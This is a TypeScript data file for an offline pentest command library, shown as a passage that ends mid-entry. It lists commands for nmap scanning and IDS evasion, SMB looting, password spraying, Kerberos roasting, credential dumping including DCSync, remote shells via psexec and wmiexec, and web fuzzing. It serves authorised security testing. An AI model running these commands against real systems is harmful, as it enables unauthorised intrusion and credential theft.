/**
 * Command Vault — searchable pentest command library.
 * Offline, keyword-searchable reference designed for copy-paste during engagements.
 * Commands are grouped by attack-target domain (network, web, radio/telecom)
 * and sub-grouped by tool inside each domain.
 */

export interface PentestCommand {
  id: string;
  tool: string;
  domain: string;
  title: string;
  command: string;
  description: string;
  tags: string[];
}

type RawCommand = Omit<PentestCommand, 'id' | 'domain'>;

/** Attack-target domains, in display order. */
export const DOMAIN_NETWORK = 'Network Pentest';
export const DOMAIN_WEB = 'Web Pentest';
export const DOMAIN_RADIO = 'Radio / Telecom';
export const DOMAIN_CLOUD = 'Cloud Pentest';
export const DOMAIN_CUSTOM = 'Custom';

export const COMMAND_DOMAINS: string[] = [DOMAIN_NETWORK, DOMAIN_WEB, DOMAIN_RADIO, DOMAIN_CLOUD];

/** Tool → attack-target domain. Unknown tools (user-added) land in Custom. */
const TOOL_DOMAIN: Record<string, string> = {
  nmap: DOMAIN_NETWORK,
  SMB: DOMAIN_NETWORK,
  'Active Directory': DOMAIN_NETWORK,
  LDAP: DOMAIN_NETWORK,
  DNS: DOMAIN_NETWORK,
  'Password attacks': DOMAIN_NETWORK,
  Transfers: DOMAIN_NETWORK,
  Web: DOMAIN_WEB,
  WiFi: DOMAIN_RADIO,
  'LTE / eNodeB': DOMAIN_RADIO,
  'SDR / RF': DOMAIN_RADIO,
  Microwave: DOMAIN_RADIO,
  AWS: DOMAIN_CLOUD,
  Azure: DOMAIN_CLOUD,
  GCP: DOMAIN_CLOUD,
  'Cloud scanners': DOMAIN_CLOUD,
  'Containers / K8s': DOMAIN_CLOUD,
  Custom: DOMAIN_CUSTOM
};

/** Domain of a command at runtime (old saved custom commands lack the field). */
export function domainOf(cmd: Pick<PentestCommand, 'domain' | 'tool'>): string {
  return cmd.domain || TOOL_DOMAIN[cmd.tool] || DOMAIN_CUSTOM;
}

const RAW: RawCommand[] = [
  /* ---------------------------------------------------------------- */
  /* nmap — discovery, scanning, evasion, NSE                          */
  /* ---------------------------------------------------------------- */
  {
    tool: 'nmap',
    title: 'Ping sweep (live hosts)',
    command: 'nmap -sn 10.10.10.0/24',
    description: 'Host discovery only — lists which IPs are alive without touching ports.',
    tags: ['host discovery', 'ping sweep', 'recon', 'live hosts']
  },
  {
    tool: 'nmap',
    title: 'ARP ping (local network)',
    command: 'nmap -sn -PR 10.10.10.0/24',
    description: 'ARP-based discovery on your own L2 segment — the most reliable sweep locally.',
    tags: ['host discovery', 'arp', 'local network', 'recon']
  },
  {
    tool: 'nmap',
    title: 'SYN ping (firewall-aware discovery)',
    command: 'nmap -Pn -PS22,80,443 10.10.10.0/24',
    description: 'TCP SYN probes on common ports to find hosts that drop ICMP.',
    tags: ['host discovery', 'firewall bypass', 'syn', 'recon']
  },
  {
    tool: 'nmap',
    title: 'Skip host discovery (-Pn)',
    command: 'nmap -Pn -sS -T4 -p- 10.10.10.10',
    description: 'Treat every target as online; the classic move when ping is blocked.',
    tags: ['firewall bypass', 'port scan', 'full scan', 'tcp']
  },
  {
    tool: 'nmap',
    title: 'Sweep with exclusions',
    command: 'nmap -sn 10.10.10.0/24 --exclude 10.10.10.1,10.10.10.254',
    description: 'Range sweep while skipping gateways/printers you must not touch.',
    tags: ['host discovery', 'targeting', 'recon']
  },
  {
    tool: 'nmap',
    title: 'Scan hosts from a file',
    command: 'nmap -iL hosts.txt -T4 -sV -oN results.nmap',
    description: 'Run a service scan against every address listed in hosts.txt.',
    tags: ['targeting', 'automation', 'version detect']
  },
  {
    tool: 'nmap',
    title: 'SYN (stealth) scan',
    command: 'nmap -sS -T4 10.10.10.10',
    description: 'Half-open TCP scan — fast and quieter than a full connect (root required).',
    tags: ['port scan', 'tcp', 'stealth', 'syn']
  },
  {
    tool: 'nmap',
    title: 'Connect scan (no root)',
    command: 'nmap -sT -T4 10.10.10.10',
    description: 'Full TCP handshake — works unprivileged but noisier in logs.',
    tags: ['port scan', 'tcp']
  },
  {
    tool: 'nmap',
    title: 'Full TCP port scan',
    command: 'nmap -p- -T4 --min-rate 1000 10.10.10.10',
    description: 'All 65535 ports with a minimum rate — complete sweep in minutes.',
    tags: ['port scan', 'full scan', 'tcp', 'fast', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'Fast scan (top 100)',
    command: 'nmap -F -T4 10.10.10.10',
    description: 'Quick first pass over the 100 most common ports.',
    tags: ['port scan', 'fast', 'tcp', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'Top N ports',
    command: 'nmap --top-ports 1000 -T4 10.10.10.10',
    description: 'Scan the N most frequently open ports — good default recon pass.',
    tags: ['port scan', 'tcp', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'Port range',
    command: 'nmap -p 1-65535 10.10.10.10',
    description: 'Explicit TCP range when you want full coverage with -sS semantics.',
    tags: ['port scan', 'tcp', 'full scan']
  },
  {
    tool: 'nmap',
    title: 'UDP scan (top ports)',
    command: 'nmap -sU --top-ports 50 -T4 10.10.10.10',
    description: 'UDP check for DNS, SNMP, NTP, SMB and friends — slow but essential.',
    tags: ['port scan', 'udp', 'scanning', 'slow']
  },
  {
    tool: 'nmap',
    title: 'UDP targeted ports',
    command: 'nmap -sU -p 53,161,162,69,123 10.10.10.10',
    description: 'Only the UDP services that usually matter in internal networks.',
    tags: ['port scan', 'udp', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'TCP + UDP combined',
    command: 'nmap -sS -sU -p T:1-1000,U:1-1000 -T4 10.10.10.10',
    description: 'Both protocol scans in one run with per-protocol port lists.',
    tags: ['port scan', 'tcp', 'udp', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'Specific ports',
    command: 'nmap -p 22,80,445 10.10.10.10',
    description: 'Check only the services you care about — fast and quiet.',
    tags: ['port scan', 'tcp', 'targeting']
  },
  {
    tool: 'nmap',
    title: 'Version detection (full TCP)',
    command: 'nmap -sV -T4 -p- 10.10.10.10',
    description: 'Full port scan with service and version fingerprinting.',
    tags: ['version detect', 'service', 'port scan', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'Aggressive scan (-A)',
    command: 'nmap -A -T4 10.10.10.10',
    description: 'OS detection + version + default scripts + traceroute in one command.',
    tags: ['aggressive', 'os detect', 'version detect', 'nse', 'recon']
  },
  {
    tool: 'nmap',
    title: 'OS detection',
    command: 'nmap -O --osscan-guess 10.10.10.10',
    description: 'Fingerprint the operating system and guess uncertain matches.',
    tags: ['os detect', 'fingerprint', 'recon']
  },
  {
    tool: 'nmap',
    title: 'Maximum version intensity',
    command: 'nmap -sV --version-intensity 9 -p- 10.10.10.10',
    description: 'Try the most aggressive probes when version detection returns nothing.',
    tags: ['version detect', 'service']
  },
  {
    tool: 'nmap',
    title: 'All version probes',
    command: 'nmap -sV --version-all -T4 10.10.10.10',
    description: 'Send both light and dark probes to every open service.',
    tags: ['version detect', 'service']
  },
  {
    tool: 'nmap',
    title: 'Default NSE scripts',
    command: 'nmap -sV --script=default -p- 10.10.10.10',
    description: 'Run the safe default script category against every service.',
    tags: ['nse', 'enum', 'scripts']
  },
  {
    tool: 'nmap',
    title: 'Vulnerability scripts',
    command: 'nmap -sV --script=vuln -p- 10.10.10.10',
    description: 'NSE vulnerability detection across all ports — a strong second pass.',
    tags: ['nse', 'vuln scan', 'exploit', 'scripts']
  },
  {
    tool: 'nmap',
    title: 'TLS flaws (Heartbleed/POODLE)',
    command: 'nmap -sV --script=ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443,8443 10.10.10.10',
    description: 'Check known TLS vulnerabilities on web/SSL endpoints.',
    tags: ['nse', 'vuln scan', 'ssl', 'tls', 'web']
  },
  {
    tool: 'nmap',
    title: 'MS17-010 (EternalBlue)',
    command: 'nmap -p 445 --script=smb-vuln-ms17-010 10.10.10.10',
    description: 'Detect the EternalBlue SMB flaw — classic Windows target check.',
    tags: ['nse', 'smb', 'vuln scan', 'eternalblue', 'windows']
  },
  {
    tool: 'nmap',
    title: 'SMB enumeration scripts',
    command: 'nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.10',
    description: 'Shares, users and OS details straight from port 445.',
    tags: ['nse', 'smb', 'enum', 'active directory', 'ad']
  },
  {
    tool: 'nmap',
    title: 'All SMB scripts',
    command: 'nmap -p 445 --script=smb* 10.10.10.10',
    description: 'Run every SMB-related NSE script in one shot.',
    tags: ['nse', 'smb', 'enum', 'ad']
  },
  {
    tool: 'nmap',
    title: 'HTTP content enum',
    command: 'nmap -p 80,443,8080 --script=http-enum 10.10.10.10',
    description: 'Discover common web paths and apps — feeds your dirbusting wordlist.',
    tags: ['nse', 'http', 'web', 'enum', 'content discovery']
  },
  {
    tool: 'nmap',
    title: 'HTTP fingerprint',
    command: 'nmap -p 80,443 --script=http-headers,http-methods,http-title 10.10.10.10',
    description: 'Headers, allowed methods and page title from NSE.',
    tags: ['nse', 'http', 'web', 'recon']
  },
  {
    tool: 'nmap',
    title: 'HTTP vulnerability scripts',
    command: 'nmap -p 80,443 --script=http-vuln* 10.10.10.10',
    description: 'Known web vulnerability checks (shellshock, heartbleed, etc.).',
    tags: ['nse', 'http', 'web', 'vuln scan']
  },
  {
    tool: 'nmap',
    title: 'DNS subdomain brute',
    command: 'nmap -p 53 --script=dns-brute 10.10.10.10',
    description: 'Brute-force subdomains through the target resolver.',
    tags: ['nse', 'dns', 'enum', 'subdomain']
  },
  {
    tool: 'nmap',
    title: 'DNS zone transfer attempt',
    command:
      'nmap -p 53 --script=dns-zone-transfer --script-args dns-zone-transfer.domain=corp.local 10.10.10.10',
    description: 'Try an AXFR against the DNS server for a full zone dump.',
    tags: ['nse', 'dns', 'zone transfer', 'enum']
  },
  {
    tool: 'nmap',
    title: 'LDAP scripts',
    command: 'nmap -p 389 --script=ldap* 10.10.10.10',
    description: 'Root DSE and entry discovery over LDAP — great on domain controllers.',
    tags: ['nse', 'ldap', 'active directory', 'ad', 'enum']
  },
  {
    tool: 'nmap',
    title: 'NFS exports',
    command: 'nmap -p 2049 --script=nfs-ls,nfs-showmount,nfs-statfs 10.10.10.10',
    description: 'List NFS exports and directory contents without mounting.',
    tags: ['nse', 'nfs', 'enum']
  },
  {
    tool: 'nmap',
    title: 'SMTP user enum',
    command: 'nmap -p 25 --script=smtp-enum-users,smtp-commands 10.10.10.10',
    description: 'Valid users via SMTP VRFY/EXPN plus supported commands.',
    tags: ['nse', 'smtp', 'enum', 'users']
  },
  {
    tool: 'nmap',
    title: 'Anonymous FTP check',
    command: 'nmap -p 21 --script=ftp-anon,ftp-syst 10.10.10.10',
    description: 'Does the FTP server allow anonymous logins? Plus server system info.',
    tags: ['nse', 'ftp', 'enum']
  },
  {
    tool: 'nmap',
    title: 'SSH details',
    command: 'nmap -p 22 --script=ssh2-enum-algos,ssh-auth-methods 10.10.10.10',
    description: 'Algorithms and auth methods offered by the SSH daemon.',
    tags: ['nse', 'ssh', 'recon']
  },
  {
    tool: 'nmap',
    title: 'SMB brute via NSE',
    command:
      "nmap -p 445 --script=smb-brute --script-args userdb=users.txt,passdb=rockyou.txt 10.10.10.10",
    description: 'Brute SMB logins directly from nmap using your wordlists.',
    tags: ['nse', 'smb', 'brute force', 'password']
  },
  {
    tool: 'nmap',
    title: 'Safe scripts only',
    command: 'nmap --script=safe -T4 10.10.10.10',
    description: 'Non-intrusive scripts — safe on fragile production targets.',
    tags: ['nse', 'safe', 'enum']
  },
  {
    tool: 'nmap',
    title: 'Script help by category',
    command: 'nmap --script-help categories',
    description: 'List every NSE category and what it contains.',
    tags: ['nse', 'reference', 'help']
  },
  {
    tool: 'nmap',
    title: 'Decoy scan',
    command: 'nmap -sS -D RND:10 -T4 10.10.10.10',
    description: 'Blend your SYN scan among 10 random decoy addresses.',
    tags: ['evasion', 'stealth', 'firewall bypass', 'ids evasion']
  },
  {
    tool: 'nmap',
    title: 'Fragmented packets',
    command: 'nmap -sS -f -T4 10.10.10.10',
    description: 'Split packets into fragments to slip past simple packet filters.',
    tags: ['evasion', 'firewall bypass', 'stealth']
  },
  {
    tool: 'nmap',
    title: 'Source port disguise (-g 53)',
    command: 'nmap -sS -g 53 -T4 10.10.10.10',
    description: 'Emerge from port 53 so the traffic looks like DNS.',
    tags: ['evasion', 'firewall bypass', 'stealth']
  },
  {
    tool: 'nmap',
    title: 'Custom payload string',
    command: "nmap -sS --data-string 'PORTAL-EU-2026' -p 80 10.10.10.10",
    description: 'Bake a known string into packets to dodge pattern-matching IDS.',
    tags: ['evasion', 'firewall bypass', 'ids evasion']
  },
  {
    tool: 'nmap',
    title: 'Bad checksum probe',
    command: 'nmap -Pn --badsum -p 80 10.10.10.10',
    description: 'Hosts that reply to invalid checksums are likely NATting or filtering oddly.',
    tags: ['evasion', 'firewall bypass', 'recon']
  },
  {
    tool: 'nmap',
    title: 'Polite timing (T2)',
    command: 'nmap -sS -T2 --max-retries 1 -p 80 10.10.10.10',
    description: 'IDS-friendly slow scan for sensitive targets.',
    tags: ['stealth', 'ids evasion', 'slow']
  },
  {
    tool: 'nmap',
    title: 'Blazing timing (T5)',
    command: 'nmap -sS -T5 --min-rate 2000 -p- 10.10.10.10',
    description: 'Fastest possible sweep — very noisy; use only when noise does not matter.',
    tags: ['fast', 'port scan', 'noisy', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'Host timeout',
    command: 'nmap -Pn -T4 --host-timeout 5m -p- 10.10.10.10',
    description: 'Give up on black-holed hosts instead of hanging the whole scan.',
    tags: ['automation', 'port scan', 'timeout']
  },
  {
    tool: 'nmap',
    title: 'Controlled rate',
    command: 'nmap -p- --min-rate 500 --max-retries 2 -T4 10.10.10.10',
    description: 'Stable speed without hammering the target or tripping rate limits.',
    tags: ['port scan', 'rate', 'automation', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'All output formats',
    command: 'nmap -sV -p- -oA scan_full 10.10.10.10',
    description: 'Save .nmap, .xml and greppable outputs with one flag.',
    tags: ['output', 'automation']
  },
  {
    tool: 'nmap',
    title: 'Greppable live hosts',
    command: 'nmap -sn -oG live.gnmap 10.10.10.0/24',
    description: 'Machine-readable list of hosts that answered the sweep.',
    tags: ['output', 'host discovery', 'automation']
  },
  {
    tool: 'nmap',
    title: 'XML output for tooling',
    command: 'nmap -sV -oX scan.xml 10.10.10.10',
    description: 'XML format for imports into Nessus, Recon-ng, or custom parsers.',
    tags: ['output', 'automation']
  },
  {
    tool: 'nmap',
    title: 'Deep-scan live hosts only',
    command: "nmap -sV -A $(grep Up live.gnmap | cut -d' ' -f2 | tr '\\n' ' ')",
    description: 'Chain your sweep into an aggressive scan of everything that replied.',
    tags: ['automation', 'recon', 'aggressive']
  },
  {
    tool: 'nmap',
    title: 'Full UDP sweep',
    command: 'nmap -sU -p- -T4 --min-rate 200 10.10.10.10',
    description: 'Every UDP port — slow and thorough; run it while you work on TCP findings.',
    tags: ['udp', 'port scan', 'slow', 'full scan', 'scanning']
  },
  {
    tool: 'nmap',
    title: 'IPv6 scan',
    command: 'nmap -6 -sV -p- 2001:db8::10',
    description: 'The same techniques over IPv6 when only v6 is reachable.',
    tags: ['ipv6', 'port scan', 'version detect']
  },
  {
    tool: 'nmap',
    title: 'Custom discovery probes',
    command: 'nmap -PE -PS80,443 -PA22 -PO 10.10.10.10',
    description: 'Mix ICMP echo, SYN, ACK and IP-protocol probes for picky firewalls.',
    tags: ['host discovery', 'recon', 'firewall bypass']
  },
  {
    tool: 'nmap',
    title: 'Vuln scripts with unsafe args',
    command: 'nmap -p 445 --script=smb-vuln* --script-args=unsafe=1 10.10.10.10',
    description: 'Allow risky vuln checks that nmap blocks by default.',
    tags: ['nse', 'smb', 'vuln scan', 'exploit']
  },

  /* ---------------------------------------------------------------- */
  /* SMB                                                               */
  /* ---------------------------------------------------------------- */
  {
    tool: 'SMB',
    title: 'List shares (no credentials)',
    command: 'smbclient -L //10.10.10.10 -N',
    description: 'Anonymous share listing — the first thing to try on port 445.',
    tags: ['smb', 'enum', 'shares', 'null session']
  },
  {
    tool: 'SMB',
    title: 'Interactive share shell',
    command: 'smbclient //10.10.10.10/share -U user%Passw0rd!',
    description: 'Drop into an FTP-like shell on the share (get/put/ls/mget).',
    tags: ['smb', 'shares', 'download']
  },
  {
    tool: 'SMB',
    title: 'Recursive download',
    command: "smbclient //10.10.10.10/share -U 'CORP\\user%Passw0rd!' -c 'recurse; prompt; mget *'",
    description: 'Pull everything from a share in one command.',
    tags: ['smb', 'shares', 'download', 'loot']
  },
  {
    tool: 'SMB',
    title: 'smbmap share listing',
    command: 'smbmap -H 10.10.10.10 -u user -p Passw0rd!',
    description: 'Permission-aware share list — shows what you can actually read/write.',
    tags: ['smb', 'enum', 'shares', 'ad']
  },
  {
    tool: 'SMB',
    title: 'smbmap recursive listing',
    command: "smbmap -H 10.10.10.10 -u user -p 'Passw0rd!' -R 'Sensitive'",
    description: 'Walk a whole share tree with permissions shown per folder.',
    tags: ['smb', 'enum', 'shares']
  },
  {
    tool: 'SMB',
    title: 'enum4linux full enum',
    command: 'enum4linux -a 10.10.10.10',
    description: 'Users, groups, shares, policies — the everything pass on SMB/RPC.',
    tags: ['smb', 'enum', 'active directory', 'ad', 'users']
  },
  {
    tool: 'SMB',
    title: 'rpcclient null session',
    command: "rpcclient -U '' 10.10.10.10",
    description: 'Low-level RPC enum: SIDs, domain info, users, alias membership.',
    tags: ['rpc', 'smb', 'enum', 'null session', 'ad']
  },
  {
    tool: 'SMB',
    title: 'SID-to-user enumeration',
    command: "impacket-lookupsid.py 'CORP/user:Passw0rd!'@10.10.10.10",
    description: 'Ride RPC SID lookups to list every domain user.',
    tags: ['rpc', 'active directory', 'ad', 'users', 'enum']
  },
  {
    tool: 'SMB',
    title: 'Find shares across a subnet',
    command: 'nxc smb 10.10.10.0/24 -u user -p Passw0rd! --shares',
    description: 'NetExec sweep for accessible shares with valid credentials.',
    tags: ['smb', 'active directory', 'ad', 'enum', 'shares', 'lateral']
  },
  {
    tool: 'SMB',
    title: 'Run a command via SMB',
    command: "nxc smb 10.10.10.10 -u user -p 'Passw0rd!' -x 'whoami'",
    description: 'Execute a single command on the host through SMB.',
    tags: ['smb', 'execute', 'lateral', 'ad']
  },
  {
    tool: 'SMB',
    title: 'Password spray',
    command: 'nxc smb 10.10.10.10 -u users.txt -p Passw0rd!',
    description: 'One password against every user — the safe way to spray.',
    tags: ['smb', 'spray', 'brute force', 'password', 'ad']
  },
  {
    tool: 'SMB',
    title: 'Mirror a share to disk',
    command: 'smbget -R smb://10.10.10.10/share',
    description: 'Recursively copy an open share down to your machine.',
    tags: ['smb', 'download', 'shares', 'loot']
  },
  {
    tool: 'SMB',
    title: 'Mount share locally',
    command: 'mount -t cifs //10.10.10.10/share /mnt -o username=user',
    description: 'Browse the share with normal Linux tools instead of an SMB shell.',
    tags: ['smb', 'shares', 'mount']
  },
  {
    tool: 'SMB',
    title: 'CrackMapExec (legacy)',
    command: "crackmapexec smb 10.10.10.10 -u user -p 'Passw0rd!' -x 'hostname'",
    description: 'Older name still common on Kali boxes — same workflow as nxc.',
    tags: ['smb', 'ad', 'execute', 'lateral']
  },

  /* ---------------------------------------------------------------- */
  /* Active Directory / Kerberos                                        */
  /* ---------------------------------------------------------------- */
  {
    tool: 'Active Directory',
    title: 'Kerberos user enumeration',
    command: 'kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt',
    description: 'Valid usernames from Kerberos pre-auth error codes — quiet and fast.',
    tags: ['ad', 'kerberos', 'enum', 'users', 'recon']
  },
  {
    tool: 'Active Directory',
    title: 'Kerberos password spray',
    command: "kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Passw0rd!'",
    description: 'Spray one password through Kerberos without locking accounts quickly.',
    tags: ['ad', 'kerberos', 'spray', 'password', 'brute force']
  },
  {
    tool: 'Active Directory',
    title: 'AS-REP roast (batch)',
    command: 'GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10',
    description: 'Find and grab hashes from accounts without Kerberos pre-auth.',
    tags: ['ad', 'kerberos', 'asrep', 'hash', 'roast']
  },
  {
    tool: 'Active Directory',
    title: 'AS-REP roast (single user)',
    command: "GetNPUsers.py 'corp.local/user' -no-pass -dc-ip 10.10.10.10",
    description: 'Check one account for pre-auth-disabled roasting.',
    tags: ['ad', 'kerberos', 'asrep', 'hash', 'roast']
  },
  {
    tool: 'Active Directory',
    title: 'Kerberoast SPNs',
    command: "GetUserSPNs.py 'corp.local/user:Passw0rd!' -dc-ip 10.10.10.10 -request",
    description: 'Request TGS tickets for service accounts, then crack them offline.',
    tags: ['ad', 'kerberos', 'kerberoast', 'spn', 'hash', 'roast']
  },
  {
    tool: 'Active Directory',
    title: 'Crack AS-REP / TGS hashes',
    command: 'hashcat -m 13100 asrep.txt /usr/share/wordlists/rockyou.txt',
    description: 'Kerberos roasting hashes (AS-REP and TGS rc4-hmac) with hashcat.',
    tags: ['ad', 'kerberos', 'hashcat', 'password', 'cracking']
  },
  {
    tool: 'Active Directory',
    title: 'Dump credentials',
    command: "secretsdump.py 'CORP/user:Passw0rd!'@10.10.10.10",
    description: 'Local SAM hashes plus domain cached secrets from a compromised host.',
    tags: ['ad', 'dump', 'hash', 'credentials']
  },
  {
    tool: 'Active Directory',
    title: 'DCSync (domain hashes)',
    command: "secretsdump.py -just-dc 'CORP/admin:Passw0rd!'@10.10.10.10",
    description: 'Replicate directory services to pull every NTDS.dit hash.',
    tags: ['ad', 'dump', 'dcsync', 'hash', 'credentials']
  },
  {
    tool: 'Active Directory',
    title: 'PSEXEC shell',
    command: "psexec.py 'CORP/user:Passw0rd!'@10.10.10.10",
    description: 'SYSTEM shell over SMB with a remote service — the classic foothold.',
    tags: ['ad', 'shell', 'lateral', 'exec']
  },
  {
    tool: 'Active Directory',
    title: 'SMBEXEC shell',
    command: "smbexec.py 'CORP/user:Passw0rd!'@10.10.10.10",
    description: 'Command execution without installing a service binary.',
    tags: ['ad', 'shell', 'exec', 'lateral']
  },
  {
    tool: 'Active Directory',
    title: 'WMIEXEC shell',
    command: "wmiexec.py 'CORP/user:Passw0rd!'@10.10.10.10",
    description: 'Semi-interactive shell over WMI — leaves fewer service artifacts.',
    tags: ['ad', 'shell', 'exec', 'lateral']
  },
  {
    tool: 'Active Directory',
    title: 'ATEXEC one-shot command',
    command: "atexec.py 'CORP/user:Passw0rd!'@10.10.10.10 whoami",
    description: 'Run a single command via a scheduled task, then clean up.',
    tags: ['ad', 'exec', 'lateral']
  },
  {
    tool: 'Active Directory',
    title: 'RDP session',
    command: "xfreerdp3 /v:10.10.10.10 /u:user /p:'Passw0rd!' /cert:ignore",
    description: 'Interactive Remote Desktop login from Kali.',
    tags: ['ad', 'rdp', 'shell', 'lateral', 'windows']
  },
  {
    tool: 'Active Directory',
    title: 'Confirm Kerberos port',
    command: 'nmap -sV -p 88 10.10.10.10',
    description: 'Verify Kerberos KDC on the domain controller before roasting.',
    tags: ['ad', 'kerberos', 'port scan', 'recon']
  },
  {
    tool: 'Active Directory',
    title: 'BloodHound collection',
    command:
      "rusthound-ce collect -d corp.local -u 'user@corp.local' -p 'Passw0rd!' --ip 10.10.10.10",
    description: 'Build the AD attack-path graph for BloodHound analysis.',
    tags: ['ad', 'bloodhound', 'enum', 'graph', 'recon']
  },
  {
    tool: 'Active Directory',
    title: 'SMB sign-on check',
    command: 'nxc smb 10.10.10.10',
    description: 'Grab the banner: domain join, signing requirements, SMB version.',
    tags: ['ad', 'smb', 'enum', 'recon']
  },
  {
    tool: 'Active Directory',
    title: 'Local-auth lateral check',
    command: "nxc smb 10.10.10.0/24 -u user -p 'Passw0rd!' --local-auth",
    description: 'Test local accounts across every host — finds password reuse.',
    tags: ['ad', 'smb', 'lateral', 'reuse']
  },
  {
    tool: 'Active Directory',
    title: 'User hunt across domain',
    command: "nxc smb 10.10.10.0/24 -u 'user' -p 'Passw0rd!' --users",
    description: 'Enumerate local/domain users from every answering SMB host.',
    tags: ['ad', 'smb', 'users', 'enum']
  },
  {
    tool: 'Active Directory',
    title: 'GPP password recovery',
    command: 'getGPPpassword.py \\\\10.10.10.10\\SYSVOL\\corp.local\\Policies\\*',
    description: 'Pull Group Policy Preferences passwords from SYSVOL.',
    tags: ['ad', 'gpp', 'credentials', 'smb', 'loot']
  },

  /* ---------------------------------------------------------------- */
  /* LDAP                                                              */
  /* ---------------------------------------------------------------- */
  {
    tool: 'LDAP',
    title: 'Root DSE (anonymous)',
    command: 'ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts',
    description: 'Discover naming contexts — the first anonymous LDAP query.',
    tags: ['ldap', 'enum', 'recon', 'ad']
  },
  {
    tool: 'LDAP',
    title: 'All domain users',
    command: "ldapsearch -x -H ldap://10.10.10.10 -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName",
    description: 'Dump every sAMAccountName in the domain.',
    tags: ['ldap', 'users', 'active directory', 'ad', 'enum']
  },
  {
    tool: 'LDAP',
    title: 'All domain computers',
    command: "ldapsearch -x -H ldap://10.10.10.10 -b 'dc=corp,dc=local' '(objectClass=computer)' name",
    description: 'List machine accounts — maps the network footprint.',
    tags: ['ldap', 'computers', 'active directory', 'ad', 'enum']
  },
  {
    tool: 'LDAP',
    title: 'Privileged accounts',
    command: "ldapsearch -x -H ldap://10.10.10.10 -b 'dc=corp,dc=local' '(adminCount=1)' sAMAccountName",
    description: 'Accounts flagged adminCount=1 — your high-value targets.',
    tags: ['ldap', 'active directory', 'ad', 'privileged', 'enum']
  },
  {
    tool: 'LDAP',
    title: 'Authenticated dump',
    command:
      "ldapsearch -x -H ldap://10.10.10.10 -D 'user@corp.local' -w 'Passw0rd!' -b 'dc=corp,dc=local'",
    description: 'Full directory read with credentials — sees more than anonymous.',
    tags: ['ldap', 'active directory', 'ad', 'enum']
  },
  {
    tool: 'LDAP',
    title: 'Offline domain dump',
    command: "ldapdomaindump 10.10.10.10 -u 'corp.local\\user' -p 'Passw0rd!'",
    description: 'Writes HTML/JSON/LDIF of users, groups, computers and policies.',
    tags: ['ldap', 'active directory', 'ad', 'enum', 'dump']
  },
  {
    tool: 'LDAP',
    title: 'Kerberoast targets via LDAP',
    command:
      "ldapsearch -x -H ldap://10.10.10.10 -b 'dc=corp,dc=local' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName",
    description: 'Find accounts with SPNs without touching Kerberos.',
    tags: ['ldap', 'kerberos', 'spn', 'active directory', 'ad']
  },
  {
    tool: 'LDAP',
    title: 'Verify bind credentials',
    command: "ldapwhoami -x -H ldap://10.10.10.10 -D 'user@corp.local' -w 'Passw0rd!'",
    description: 'Confirm the bind works before running heavier queries.',
    tags: ['ldap', 'auth', 'recon']
  },

  /* ---------------------------------------------------------------- */
  /* DNS                                                               */
  /* ---------------------------------------------------------------- */
  {
    tool: 'DNS',
    title: 'Zone transfer (AXFR)',
    command: 'dig axfr @10.10.10.10 corp.local',
    description: 'Attempt a full zone transfer — jackpot when it works.',
    tags: ['dns', 'zone transfer', 'enum', 'recon']
  },
  {
    tool: 'DNS',
    title: 'Any-record query',
    command: 'dig any corp.local @10.10.10.10',
    description: 'Pull every record type for the domain in one query.',
    tags: ['dns', 'recon']
  },
  {
    tool: 'DNS',
    title: 'Reverse lookup',
    command: 'dig -x 10.10.10.10 @10.10.10.10',
    description: 'PTR lookup — turns IPs into hostnames.',
    tags: ['dns', 'reverse', 'recon']
  },
  {
    tool: 'DNS',
    title: 'Quick answer',
    command: 'dig +short A www.corp.local @10.10.10.10',
    description: 'Just the answer — no fluff — for fast scripting.',
    tags: ['dns', 'recon']
  },
  {
    tool: 'DNS',
    title: 'dnsrecon standard enum',
    command: 'dnsrecon -d corp.local -n 10.10.10.10 -t std',
    description: 'Records, zone transfer attempt and brute in one tool.',
    tags: ['dns', 'enum', 'recon']
  },
  {
    tool: 'DNS',
    title: 'dnsenum + subdomain list',
    command:
      'dnsenum corp.local --dnsserver 10.10.10.10 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
    description: 'Zone transfer attempts plus brute-force subdomains.',
    tags: ['dns', 'enum', 'subdomain', 'brute force']
  },
  {
    tool: 'DNS',
    title: 'Passive subdomains',
    command: 'sublist3r -d corp.local',
    description: 'OSINT subdomain discovery from search engines and CT logs.',
    tags: ['dns', 'subdomain', 'osint', 'recon']
  },

  /* ---------------------------------------------------------------- */
  /* Web                                                               */
  /* ---------------------------------------------------------------- */
  {
    tool: 'Web',
    title: 'Content discovery (gobuster)',
    command:
      'gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50',
    description: 'Directory and file brute force with extension filtering.',
    tags: ['web', 'http', 'enum', 'brute force', 'content discovery']
  },
  {
    tool: 'Web',
    title: 'Recursive fuzzing (feroxbuster)',
    command:
      'feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --auto-tune',
    description: 'Recursive content discovery that follows what it finds.',
    tags: ['web', 'http', 'enum', 'content discovery']
  },
  {
    tool: 'Web',
    title: 'Vhost brute force',
    command:
      "ffuf -u http://10.10.10.10 -H 'Host: FUZZ.corp.local' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
    description: 'Discover virtual hosts by fuzzing the Host header.',
    tags: ['web', 'http', 'vhost', 'brute force', 'subdomain']
  },
  {
    tool: 'Web',
    title: 'Parameter discovery',
    command:
      "ffuf -u 'http://10.10.10.10/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0",
    description: 'Find hidden GET parameters worth testing.',
    tags: ['web', 'http', 'fuzzing', 'sqli']
  },
  {
    tool: 'Web',
    title: 'Nikto misconfig scan',
